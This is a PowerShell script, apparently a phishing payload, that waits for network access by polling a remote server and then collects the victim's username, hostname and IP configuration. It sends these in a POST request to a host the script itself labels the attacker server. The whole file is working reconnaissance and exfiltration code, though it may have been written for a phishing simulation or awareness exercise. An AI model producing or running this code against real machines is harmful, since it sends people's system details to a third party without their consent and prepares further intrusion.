
#Check whether can connect to internet or sleep until internet access is turned on
$loop = 'true'

try
{
    $Response = Invoke-WebRequest -Uri "http://<google cloud ip>/phish_response.php" -UseBasicParsing
    # This will only execute if the Invoke-WebRequest is successful.
    $StatusCode = $Response.StatusCode
}
catch
{
    $StatusCode = $_.Exception.Response.StatusCode.value__
}



#loop checking if status code is not 200

while(($StatusCode) -ne '200'){

    Start-Sleep -s 15

    try
{
    $Response = Invoke-WebRequest -Uri "http://<google cloud ip>/phish_response.php" -UseBasicParsing
    # This will only execute if the Invoke-WebRequest is successful.
    $StatusCode = $Response.StatusCode
}
catch
{
    $StatusCode = $_.Exception.Response.StatusCode.value__
}
    
}




# SEND FIRST EMAIL FOR SYSTEM INFO

$username_command = whoami
$hostname_command = hostname
$ipaddr_command = ipconfig

$username_output = "Username : "
$hostname_output = "Hostname : "
$ip_output = "IP : "
$newline = "`r`n"
$location = "RESTROOM"
$location_output = "LOCATION : "

$sysinfo = $username_output+$username_command+$newline+$hostname_output+$hostname_command+$newline+$ip_output+$ipaddr_command+$newline+$newline+$location_output+$location+$newline




# SEND POST REQUEST TO ATTACKER SERVER

$Body = @{
    sysinfo_post = $sysinfo;
}

Invoke-WebRequest 'http://<google cloud ip>/phish_response.php' -Body $Body -Method 'POST' -UseBasicParsing
$loop='false'
